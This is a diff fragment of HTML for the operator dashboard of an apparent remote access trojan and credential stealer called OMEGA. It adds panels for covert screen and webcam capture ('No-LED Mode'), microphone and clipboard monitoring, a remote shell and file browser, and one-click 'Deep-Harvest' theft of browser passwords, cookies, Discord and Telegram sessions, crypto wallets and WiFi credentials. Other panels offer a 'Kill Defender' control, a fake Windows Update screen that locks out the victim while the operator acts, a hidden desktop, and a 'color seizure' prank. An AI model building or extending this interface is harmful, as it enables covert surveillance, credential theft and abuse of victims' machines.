+                                <svg id="streamBtnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                                <span id="streamBtnText">Start Stream</span>
+                            </button>
+                            <span class="stream-fps" id="streamFps">—</span>
+                            <div style="flex-grow:1"></div>
+
+                            <div id="activeStyleBadge" class="badge badge-teal" style="font-size:10px;padding:2px 8px;text-transform:uppercase;">Standard</div>
+                            <div class="ctrl-divider"></div>
+                            <span style="font-size:0.7rem;color:var(--text-muted)" id="streamRes">MJPEG · AnyDesk-Tier</span>
+                        </div>
+
+                        <!-- Stream canvas -->
+                        <div class="stream-canvas" id="streamCanvas">
+                            <div class="stream-placeholder" id="streamPlaceholder">
+                                <div class="stream-placeholder-icon">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                                </div>
+                                <p>Click <strong>Start Stream</strong> to begin live capture</p>
+                                <p style="font-size:0.75rem;color:var(--text-muted);margin-top:0.35rem">Multiple monitors · 50+ styles · Keyboard &amp; mouse injection</p>
+                            </div>
+
+                            <!-- Main stream image -->
+                            <div id="mainStreamView" style="display:none;width:100%;height:100%;position:relative;"
+                                onmouseenter="$('streamOverlay').style.opacity='1'"
+                                onmouseleave="$('streamOverlay').style.opacity='0'">
+                                <img id="desktopViewImg"
+                                     style="width:100%;height:100%;object-fit:contain;display:block;cursor:crosshair;transition:opacity 0.25s ease;"
+                                     onmousedown="handleStreamHID(event)"
+                                     onmouseup="handleStreamHID(event)"
+                                     onmousemove="handleStreamHID(event)"
+                                     oncontextmenu="return false;">
+
+                                <!-- ── FLOATING OVERLAY CONTROLS ── -->
+                                <div id="streamOverlay" style="
+                                    position:absolute;bottom:0;left:0;right:0;
+                                    display:flex;align-items:center;justify-content:space-between;
+                                    padding:10px 16px;
+                                    background:linear-gradient(transparent,rgba(0,0,0,0.75));
+                                    z-index:40;pointer-events:none;gap:10px;
+                                    opacity:0;transition:opacity 0.2s ease;border-radius:0 0 8px 8px;">
+
+                                    <!-- Left: Mouse+KB control + stream toggle -->
+                                    <div style="display:flex;gap:8px;align-items:center;pointer-events:all">
+                                        <button id="ovr-mnk-btn" onclick="toggleOverlayMNK()" style="
+                                            background:rgba(255,71,87,0.85);border:none;border-radius:20px;
+                                            color:#fff;font-size:0.72rem;font-weight:700;
+                                            padding:5px 14px;cursor:pointer;letter-spacing:0.03em;
+                                            transition:background 0.15s;white-space:nowrap">
+                                            🖱️ Control: OFF
+                                        </button>
+                                        <button onclick="toggleStream()" style="
+                                            background:rgba(10,10,20,0.8);border:1px solid rgba(255,255,255,0.15);
+                                            border-radius:20px;color:#fff;font-size:0.72rem;font-weight:600;
+                                            padding:5px 12px;cursor:pointer;white-space:nowrap">
+                                            ⏺ Stream
+                                        </button>
+                                    </div>
+
+                                    <!-- Center: FPS -->
+                                    <div style="font-size:0.7rem;color:rgba(255,255,255,0.55);pointer-events:none;text-align:center">
+                                        <span id="ovr-fps">—</span> fps
+                                    </div>
+
+                                    <!-- Right: Audio controls -->
+                                    <div style="display:flex;align-items:center;gap:8px;pointer-events:all">
+                                        <button id="ovr-audio-btn" onclick="toggleDesktopAudio()" style="
+                                            background:rgba(10,10,20,0.8);border:1px solid rgba(255,255,255,0.15);
+                                            border-radius:20px;color:#fff;font-size:0.72rem;
+                                            padding:5px 12px;cursor:pointer;transition:border-color 0.15s">
+                                            🔇 Audio
+                                        </button>
+                                        <button id="ovr-mic-btn" onclick="toggleMicAudio()" style="
+                                            background:rgba(10,10,20,0.8);border:1px solid rgba(255,255,255,0.15);
+                                            border-radius:20px;color:#fff;font-size:0.72rem;
+                                            padding:5px 12px;cursor:pointer;transition:border-color 0.15s">
+                                            🎙️ Mic
+                                        </button>
+                                        <button onclick="setCamOn(0)" style="
+                                            background:rgba(10,10,20,0.8);border:1px solid rgba(255,255,255,0.15);
+                                            border-radius:20px;color:#fff;font-size:0.72rem;
+                                            padding:5px 10px;cursor:pointer">
+                                            📷 Cam
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Pip camera -->
+                                <div id="pipCamView" style="position:absolute;bottom:52px;right:20px;width:180px;height:120px;background:#000;border-radius:8px;border:1px solid rgba(139,92,246,0.3);overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);display:none;">
+                                    <img id="cameraViewImg" style="width:100%;height:100%;object-fit:cover;">
+                                </div>
+
+                                <!-- AnyDesk-style cursor overlay -->
+                                <div id="streamCursor" style="display:none;position:absolute;pointer-events:none;z-index:50;transform:translate(-2px,-2px);">
+                                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                                        <path d="M4 2L4 16L8 12L11 18L13 17L10 11L16 11Z" fill="rgba(139,92,246,0.9)" stroke="rgba(255,255,255,0.8)" stroke-width="1"/>
+                                    </svg>
+                                </div>
+                            </div>
+
+                            <!-- Monitor grid (all screens) -->
+                            <div id="monitorGridView" style="display:none;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px;padding:15px;height:100%;overflow-y:auto;">
+                                <!-- Populated dynamically -->
+                            </div>
+                        </div>
+
+                        <!-- Styles Gallery -->
+                        <div class="styles-gallery-container" id="stylesGalleryContainer">
+                            <div class="gallery-header">
+                                <span>STREAM STYLES (50+ PRESETS)</span>
+                                <div class="gallery-nav">
+                                    <button class="btn btn-ghost" onclick="$('stylesGallery').scrollBy({left:-200,behavior:'smooth'})">←</button>
+                                    <button class="btn btn-ghost" onclick="$('stylesGallery').scrollBy({left:200,behavior:'smooth'})">→</button>
+                                </div>
+                            </div>
+                            <div class="styles-gallery" id="stylesGallery"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Shell ── -->
+                <div class="modal-panel" id="panel-shell">
+                    <div class="shell-output" id="shellOutput"><span style="color:var(--accent-violet)">OMEGA Terminus v21.5 — Encrypted Shell</span>
+<span style="color:var(--text-muted)">Type commands and press Enter. Arrow keys for history. Keyboard input forwards to agent during stream.</span>
+</div>
+                    <div class="shell-prompt-row">
+                        <span class="shell-ps">ω&nbsp;~&gt;</span>
+                        <input type="text" class="shell-input" id="shellInput" placeholder="Enter command…" autocomplete="off" spellcheck="false" onkeydown="handleShellKey(event)">
+                    </div>
+                </div>
+
+                <!-- ── File Explorer ── -->
+                <div class="modal-panel" id="panel-files">
+                    <div class="file-topbar">
+                        <button class="btn btn-ghost" id="fileBackBtn" onclick="fileBack()" style="padding:0.4rem 0.7rem;" disabled>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px"><polyline points="15 18 9 12 15 6"/></svg>
+                        </button>
+                        <div class="file-path-input-wrap">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;color:var(--text-muted);flex-shrink:0"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+                            <input type="text" class="file-path-input" id="filePath" value="C:\" onkeydown="if(event.key==='Enter') navigatePath()">
+                        </div>
+                        <button class="btn btn-ghost" onclick="navigatePath()" style="padding:0.4rem 0.8rem;font-size:0.78rem;">Go</button>
+                    </div>
+                    <div class="file-list" id="fileList">
+                        <div style="padding:3rem;text-align:center;color:var(--text-muted);font-size:0.85rem">Navigate to a directory to browse files.</div>
+                    </div>
+                </div>
+
+                <!-- ── System Intel ── -->
+                <div class="modal-panel" id="panel-intel">
+                    <div class="card" style="padding:1.25rem;margin-bottom:1.5rem;border:1px solid rgba(139,92,246,0.3);background:rgba(139,92,246,0.03)">
+                        <div style="font-weight:700;margin-bottom:0.5rem;color:var(--accent-violet);display:flex;align-items:center;gap:0.5rem;">
+                            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            Omega Harvest (Deep Extraction)
+                        </div>
+                        <p style="font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;">Extract all browser passwords, cookies, Discord tokens, and crypto wallet files into an encrypted ZIP bundle.</p>
+                        <button class="btn btn-operate" onclick="triggerHarvest()" style="background:var(--accent-violet);color:#fff;border:none;">
+                            Initiate Core Harvest
+                        </button>
+                    </div>
+                    <div class="intel-panel" id="intelPanel"></div>
+                </div>
+
+                <!-- ── Task Manager ── -->
+                <div class="modal-panel" id="panel-tasks">
+                    <div class="task-manager-wrap">
+                        <div class="task-manager-header">
+                            <div style="display:flex;align-items:center;gap:1rem;">
+                                <span style="font-weight:700;font-size:0.95rem;color:var(--accent-violet)">Task Manager</span>
+                                <span id="procCount" style="font-size:0.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace">0 processes</span>
+                            </div>
+                            <div style="display:flex;align-items:center;gap:0.75rem;">
+                                <input type="text" id="procFilter" class="proc-filter-input" placeholder="Filter by name…" oninput="filterProcs()">
+                                <button class="btn btn-ghost" onclick="refreshProcessList()" style="padding:0.35rem 0.75rem;font-size:0.75rem;">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                                    Refresh
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="task-manager-table-wrap">
+                            <table class="task-manager-table">
+                                <thead>
+                                    <tr>
+                                        <th><button class="proc-sort-btn" data-col="pid" onclick="sortProcs('pid')">PID</button></th>
+                                        <th><button class="proc-sort-btn" data-col="name" onclick="sortProcs('name')">Process Name</button></th>
+                                        <th><button class="proc-sort-btn" data-col="cpu" onclick="sortProcs('cpu')">CPU</button></th>
+                                        <th><button class="proc-sort-btn" data-col="mem" onclick="sortProcs('mem')">Memory</button></th>
+                                        <th><button class="proc-sort-btn" data-col="status" onclick="sortProcs('status')">Status</button></th>
+                                        <th style="width:70px">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="procTableBody">
+                                    <tr><td colspan="6" style="text-align:center;padding:3rem;color:var(--text-muted)">Select a node and open Task Manager to view processes.</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Stealer Ops ── -->
+                <div class="modal-panel" id="panel-stealer">
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-bottom:1.5rem;width:100%">
+                        <div class="card" style="padding:1.25rem;border:1px solid rgba(251,191,36,0.25);background:rgba(251,191,36,0.02)">
+                            <div style="font-weight:700;margin-bottom:0.5rem;color:var(--accent-amber);display:flex;align-items:center;gap:0.5rem;">
+                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                                Omega Deep-Harvest
+                            </div>
+                            <p style="font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;">Extract all passwords, cookies, Discord tokens, crypto wallets, WiFi, and Telegram sessions.</p>
+                            <button class="btn btn-operate" id="btnRunHarvest" onclick="triggerHarvest()" style="background:var(--accent-amber);color:#111;border:none;width:100%;font-weight:700;justify-content:center;">
+                                EXECUTE DEEP EXTRACTION
+                            </button>
+                        </div>
+                        <div class="card" style="padding:1.25rem;border:1px solid rgba(139,92,246,0.2)">
+                            <div style="font-weight:700;margin-bottom:0.8rem;color:var(--accent-violet)">Harvest Summary</div>
+                            <div id="harvestStats" style="font-size:0.75rem;line-height:1.6;color:var(--text-primary)">
+                                <div style="display:flex;justify-content:space-between"><span>Browsers:</span><span style="color:var(--accent-teal)">Chrome, FF, Edge, Brave...</span></div>
+                                <div style="display:flex;justify-content:space-between"><span>IM Sessions:</span><span style="color:var(--accent-teal)">Discord, Telegram</span></div>
+                                <div style="display:flex;justify-content:space-between"><span>Crypto:</span><span style="color:var(--accent-teal)">Wallets + Extensions</span></div>
+                                <div style="display:flex;justify-content:space-between"><span>System:</span><span style="color:var(--accent-teal)">WiFi, FileZilla</span></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card" style="flex-grow:1;display:flex;flex-direction:column;min-height:300px;width:100%;background:rgba(0,0,0,0.3);border:1px solid var(--border-default)">
+                        <div style="padding:0.75rem 1rem;border-bottom:1px solid var(--border-default);font-size:0.7rem;font-weight:700;color:var(--text-muted);display:flex;justify-content:space-between;align-items:center;">
+                            <span>EXTRACTION LOG (LIVE)</span>
+                            <div style="display:flex;gap:1rem;align-items:center;">
+                                <div id="harvesterStatus" style="font-size:0.65rem;color:var(--accent-teal);font-family:monospace">● STATUS: STANDBY</div>
+                                <button class="btn btn-ghost" onclick="$('stealerLog').innerHTML='[CLEARED]'" style="padding:2px 6px;font-size:0.6rem">Clear</button>
+                            </div>
+                        </div>
+                        <div id="stealerLog" style="flex-grow:1;padding:1rem;font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--accent-teal);overflow-y:auto;white-space:pre-wrap;">[READY] Awaiting operator command...</div>
+                    </div>
+                </div>
+
+                <!-- ── Camera Controls ── -->
+                <div class="modal-panel" id="panel-camera">
+                    <div class="v22-section">
+                        <div class="v22-section-title">📷 Camera PiP — Multi-Cam / No-LED</div>
+                        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:1rem">
+                            <button class="btn btn-operate" onclick="setCamOn(0)" style="justify-content:center">▶ Open Camera PiP</button>
+                            <button class="btn btn-ghost" onclick="setCamOff()" style="justify-content:center">✕ Close PiP</button>
+                            <button class="btn btn-ghost" onclick="camSnapshot()" style="justify-content:center">📸 Snapshot</button>
+                            <button class="btn btn-ghost" onclick="toggleCamLed()" id="btn-led-toggle" style="justify-content:center">💡 Toggle LED Mode</button>
+                        </div>
+                        <div style="display:flex;gap:10px;align-items:center;margin-bottom:1rem">
+                            <label style="font-size:0.8rem;color:var(--text-muted)">Select Camera:</label>
+                            <select id="cam-select-main" onchange="switchCamera(this.value)" style="background:rgba(0,0,0,0.4);border:1px solid var(--border-default);color:var(--text-primary);padding:6px 10px;border-radius:8px;outline:none;flex:1">
+                                <option value="0">Camera 0 (default)</option>
+                            </select>
+                            <button class="btn btn-ghost" onclick="safeSend({t:'cam_enum',type:'cam_enum'});logIntel('Scanning cameras…','info')" style="white-space:nowrap">🔍 Scan</button>
+                        </div>
+                        <div style="font-size:0.78rem;color:var(--text-muted);background:rgba(16,212,168,0.05);border:1px solid rgba(16,212,168,0.15);border-radius:10px;padding:10px 14px">
+                            <strong style="color:var(--accent-teal)">No-LED Mode:</strong> Uses DirectShow burst-capture (open → grab → close) to minimise the camera indicator light. Works with physical webcams, virtual cameras (OBS, ManyCam), and IP cameras.
+                        </div>
+                        <div style="margin-top:1.2rem">
+                            <div class="v22-section-title">Corner Snap</div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;max-width:200px">
+                                <button class="pip-corner" onclick="setPipCorner('tl')">↖ Top Left</button>
+                                <button class="pip-corner" onclick="setPipCorner('tr')">↗ Top Right</button>
+                                <button class="pip-corner" onclick="setPipCorner('bl')">↙ Bot Left</button>
+                                <button class="pip-corner" onclick="setPipCorner('br')">↘ Bot Right</button>
+                            </div>
+                            <p style="font-size:0.75rem;color:var(--text-muted);margin-top:0.5rem">Or drag the PiP overlay anywhere on screen.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Audio ── -->
+                <div class="modal-panel" id="panel-audio">
+                    <div class="v22-section">
+                        <div class="v22-section-title">🔊 Audio Capture</div>
+                        <div class="audio-btn-row">
+                            <button class="btn btn-operate" id="btn-da" onclick="toggleDesktopAudio()" style="justify-content:center">🔊 Desktop Audio</button>
+                            <button class="btn btn-operate" id="btn-mic" onclick="toggleMicAudio()" style="justify-content:center">🎤 Microphone</button>
+                        </div>
+                        <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:1.2rem">Desktop loopback captures all system audio (games, videos, calls). Microphone captures the physical mic. Both stream PCM to your browser in real-time.</p>
+                    </div>
+                    <div class="v22-section">
+                        <div class="v22-section-title">🎚 Remote Volume</div>
+                        <div class="volume-row">
+                            <label for="vol-slider">Volume</label>
+                            <input type="range" id="vol-slider" min="0" max="100" value="50" oninput="$('vol-label').textContent=this.value+'%'" onchange="sendVolume(this.value)">
+                            <span id="vol-label">50%</span>
+                            <button class="btn btn-ghost" onclick="getRemoteVolume()" style="padding:4px 10px;font-size:0.75rem">Get</button>
+                        </div>
+                    </div>
+                    <div class="v22-section">
+                        <div class="v22-section-title">🎬 Screen Recorder</div>
+                        <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.8rem">Records the live stream as a .webm video saved to your downloads. Start the stream first.</p>
+                        <button class="btn btn-operate" id="btn-rec-panel" onclick="toggleScreenRecorder()" style="justify-content:center">⏺ Start Recording</button>
+                    </div>
+                    <div class="v22-section">
+                        <div class="v22-section-title">📸 Screenshot Scheduler</div>
+                        <div style="display:flex;gap:8px;align-items:center;margin-bottom:0.6rem">
+                            <label style="font-size:0.8rem;color:var(--text-muted);white-space:nowrap">Every</label>
+                            <input type="number" id="sched-interval-input" value="10" min="3" max="3600" style="width:70px;background:rgba(0,0,0,0.3);border:1px solid var(--border-default);color:var(--text-primary);padding:5px 8px;border-radius:6px;outline:none;font-size:0.8rem">
+                            <label style="font-size:0.8rem;color:var(--text-muted)">seconds</label>
+                            <button class="btn btn-operate" id="btn-sched-ss" onclick="toggleSchedSS()" style="justify-content:center">▶ Start Scheduler</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Clipboard ── -->
+                <div class="modal-panel" id="panel-clipboard">
+                    <div class="v22-section">
+                        <div class="v22-section-title">📋 Clipboard Monitor</div>
+                        <div style="display:flex;gap:8px;margin-bottom:0.8rem">
+                            <button class="btn btn-operate" id="btn-clip-monitor" onclick="toggleClipMonitor()" style="justify-content:center">▶ Start Monitor</button>
+                            <button class="btn btn-ghost" onclick="readClipboard()" style="justify-content:center">📖 Read Now</button>
+                            <button class="btn btn-ghost" onclick="clearClipLog()" style="justify-content:center">🗑 Clear Log</button>
+                        </div>
+                        <div id="clip-log"><div style="padding:2rem;text-align:center;color:var(--text-muted)">No captures yet</div></div>
+                    </div>
+                    <div class="v22-section">
+                        <div class="v22-section-title">💉 Inject Clipboard</div>
+                        <div class="clip-inject-row">
+                            <input type="text" id="clip-inject-input" placeholder="Text to inject into remote clipboard…">
+                            <button class="btn btn-operate" onclick="injectClipboard()" style="white-space:nowrap">Inject</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Recon ── -->
+                <div class="modal-panel" id="panel-recon">
+                    <!-- Network connections -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            🌐 Active Connections (netstat)
+                            <button class="btn btn-ghost" onclick="fetchConnections()" style="padding:3px 10px;font-size:0.72rem">Refresh</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>Process</th></tr></thead>
+                            <tbody id="connections-tbody"><tr><td colspan="5" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Refresh</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- LAN Scan -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            📡 LAN Scanner
+                            <button class="btn btn-operate" onclick="startLanScan()" style="padding:3px 12px;font-size:0.72px">Scan Now</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>IP</th><th>Hostname</th><th>Status</th><th>Open Ports</th></tr></thead>
+                            <tbody id="lan-scan-tbody"><tr><td colspan="4" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Scan Now</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- Installed Software -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            📦 Installed Software
+                            <button class="btn btn-ghost" onclick="fetchSoftware()" style="padding:3px 10px;font-size:0.72rem">Load</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>Name</th><th>Version</th><th>Publisher</th><th>Date</th></tr></thead>
+                            <tbody id="software-tbody"><tr><td colspan="4" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Load</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- Browser History -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            🕘 Browser History
+                            <button class="btn btn-ghost" onclick="fetchHistory()" style="padding:3px 10px;font-size:0.72rem">Load</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>Browser</th><th>URL / Title</th><th>Visits</th></tr></thead>
+                            <tbody id="history-tbody"><tr><td colspan="3" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Load</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- Startup Programs -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            🚀 Startup Programs
+                            <button class="btn btn-ghost" onclick="fetchStartup()" style="padding:3px 10px;font-size:0.72rem">Load</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>Name</th><th>Command</th><th>Location</th><th>Action</th></tr></thead>
+                            <tbody id="startup-tbody"><tr><td colspan="4" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Load</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- Env Vars -->
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            🔑 Environment Variables
+                            <button class="btn btn-ghost" onclick="fetchEnv()" style="padding:3px 10px;font-size:0.72rem">Load</button>
+                        </div>
+                        <div class="recon-table-wrap">
+                            <table><thead><tr><th>Variable</th><th>Value</th></tr></thead>
+                            <tbody id="env-tbody"><tr><td colspan="2" style="text-align:center;padding:2rem;color:var(--text-muted)">Click Load</td></tr></tbody></table>
+                        </div>
+                    </div>
+
+                    <!-- System Controls -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">⚙ System Controls</div>
+                        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px">
+                            <button class="btn btn-ghost" onclick="toggleRdp(true)" style="justify-content:center">🖥 Enable RDP</button>
+                            <button class="btn btn-ghost" onclick="toggleRdp(false)" style="justify-content:center">🖥 Disable RDP</button>
+                            <button class="btn btn-ghost" onclick="toggleDefender(false)" style="color:var(--accent-amber);border-color:var(--accent-amber);justify-content:center">🛡 Kill Defender</button>
+                            <button class="btn btn-ghost" onclick="toggleDefender(true)" style="justify-content:center">🛡 Enable Defender</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── GeoIP ── -->
+                <div class="modal-panel" id="panel-geo">
+                    <div class="v22-section">
+                        <div class="v22-section-title" style="display:flex;align-items:center;justify-content:space-between">
+                            🌍 GeoIP Location
+                            <button class="btn btn-operate" onclick="fetchGeo()" style="padding:4px 14px;font-size:0.78rem">Locate</button>
+                        </div>
+                        <div id="geo-info-panel">
+                            <div style="text-align:center;padding:3rem;color:var(--text-muted)">Click Locate to fetch GeoIP data for this node. Includes ISP, city, country, and map.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Trolling & Power (v25 ULTRA EXPANDED) ── -->
+                <div class="modal-panel" id="panel-troll">
+
+                    <!-- ══════════════════════════════════════════════════ -->
+                    <!-- ██  FAKE UPDATE SCREEN  +  HIDDEN OPERATOR DESKTOP ██ -->
+                    <!-- ══════════════════════════════════════════════════ -->
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin-bottom:1.5rem;width:100%">
+
+                        <!-- Fake Update Card -->
+                        <div class="card" style="padding:1.25rem;border:1px solid rgba(255,71,87,0.4);background:rgba(255,71,87,0.04)">
+                            <div style="font-weight:700;font-size:0.95rem;margin-bottom:0.4rem;color:var(--accent-red);display:flex;align-items:center;gap:0.5rem">
+                                🪟 Fake Windows Update Screen
+                                <span id="fake-update-badge" style="font-size:0.65rem;font-weight:600;color:var(--text-muted);margin-left:auto">⚫ STANDBY</span>
+                            </div>
+                            <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:1rem;line-height:1.5">
+                                Deploys a pixel-perfect Win11 update overlay on the user's primary monitor.
+                                All other monitors go black. <strong style="color:var(--accent-teal)">You retain full remote control.</strong>
+                            </p>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:0.75rem">
+                                <button id="btn-fake-update-deploy" class="btn btn-operate"
+                                    onclick="deployFakeUpdate()"
+                                    style="justify-content:center;font-weight:700;background:rgba(255,71,87,0.15);border-color:var(--accent-red);color:var(--accent-red)">
+                                    🚀 Deploy Update
+                                </button>
+                                <button id="btn-fake-update-revert" class="btn btn-ghost"
+                                    onclick="revertFakeUpdate()"
+                                    style="justify-content:center;color:var(--accent-teal);border-color:var(--accent-teal)"
+                                    disabled>
+                                    ↩ Revert to Normal
+                                </button>
+                            </div>
+                            <div style="font-size:0.72rem;color:var(--text-muted);background:rgba(16,212,168,0.05);border:1px solid rgba(16,212,168,0.15);border-radius:8px;padding:8px 10px;line-height:1.5">
+                                💡 <strong style="color:var(--accent-teal)">How it works:</strong>
+                                User sees realistic update animation (0%→100%) and cannot interact.
+                                Your stream + mouse control stay active — operate freely in the background.
+                                Hit <em>Revert</em> to instantly close all overlays.
+                            </div>
+                        </div>
+
+                        <!-- Hidden Operator Desktop Card -->
+                        <div class="card" style="padding:1.25rem;border:1px solid rgba(167,139,250,0.3);background:rgba(167,139,250,0.03)">
+                            <div style="font-weight:700;font-size:0.95rem;margin-bottom:0.4rem;color:var(--accent-violet);display:flex;align-items:center;gap:0.5rem">
+                                🕵 Hidden Operator Desktop
+                            </div>
+                            <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.75rem;line-height:1.5">
+                                Creates a <strong style="color:var(--accent-violet)">separate Win32 desktop</strong> — completely invisible to the user.
+                                Run any program there; only you see it via the stream panel below.
+                            </p>
+                            <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:8px;align-items:end">
+                                <div>
+                                    <label style="font-size:0.72rem;color:var(--text-muted)">Process to run on hidden desktop</label>
+                                    <input type="text" id="hidden-desk-prog-input" class="file-path-input"
+                                        value="explorer.exe"
+                                        style="width:100%;margin-top:3px;font-size:0.82rem">
+                                </div>
+                                <button class="btn btn-operate" onclick="openHiddenDesk()"
+                                    style="justify-content:center;white-space:nowrap;color:var(--accent-violet);border-color:var(--accent-violet)">
+                                    ▶ Open
+                                </button>
+                            </div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px">
+                                <button id="btn-hidden-stream" class="btn btn-ghost"
+                                    onclick="toggleHiddenStream()"
+                                    style="justify-content:center;font-size:0.75rem">
+                                    ▶ Start Hidden Stream
+                                </button>
+                                <button class="btn btn-ghost" onclick="snapHiddenDesk()"
+                                    style="justify-content:center;font-size:0.75rem">
+                                    📸 Snapshot
+                                </button>
+                                <button class="btn btn-ghost" onclick="closeHiddenDesk()"
+                                    style="justify-content:center;font-size:0.75rem;color:var(--accent-red);border-color:var(--accent-red)">
+                                    ✕ Close
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- Hidden Desktop Live View (operator-only, auto-appears on first frame) -->
+                    <div id="hidden-desk-panel" style="display:none;flex-direction:column;width:100%;margin-bottom:1.5rem;background:rgba(0,0,0,0.5);border:1px solid rgba(167,139,250,0.3);border-radius:12px;overflow:hidden">
+                        <div style="padding:8px 14px;border-bottom:1px solid rgba(167,139,250,0.2);display:flex;align-items:center;gap:10px;background:rgba(167,139,250,0.05)">
+                            <span style="font-size:0.75rem;font-weight:700;color:var(--accent-violet)">🕵 HIDDEN DESKTOP FEED — operator eyes only</span>
+                            <span style="font-size:0.65rem;color:var(--text-muted);margin-left:auto">~10fps &nbsp;|&nbsp; tag 0x0A</span>
+                            <button class="btn btn-ghost" onclick="$('hidden-desk-panel').style.display='none'"
+                                style="padding:2px 8px;font-size:0.65rem">Hide</button>
+                        </div>
+                        <img id="hidden-desk-view" src="" alt="Hidden desktop feed"
+                            style="width:100%;max-height:420px;object-fit:contain;background:#000;display:block">
+                    </div>
+
+                    <!-- ── SCREEN / CAMERA OPERATIONS ── -->
+                    <div class="v22-section">
+                        <div class="v22-section-title">🖥 Screen & Camera Ops</div>
+                        <div class="troll-grid-v22">
+                            <button class="btn btn-ghost" onclick="sendTroll('freeze_screen')" style="justify-content:center;color:var(--accent-teal)">🧊 Freeze Screen</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('cam_freeze_frame')" style="justify-content:center;color:var(--accent-teal)">📷 Cam Freeze Frame</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('invert_screen')" style="justify-content:center">🔀 Invert Screen</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('screen_off')" style="justify-content:center">🌑 Monitor Off</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('screen_on')" style="justify-content:center">💡 Monitor On</button>
+                            <button class="btn btn-ghost" onclick="sendTroll('color_seizure',{count:40})" style="justify-content:center;color:var(--accent-red)">🌈 Color Seizure</button>
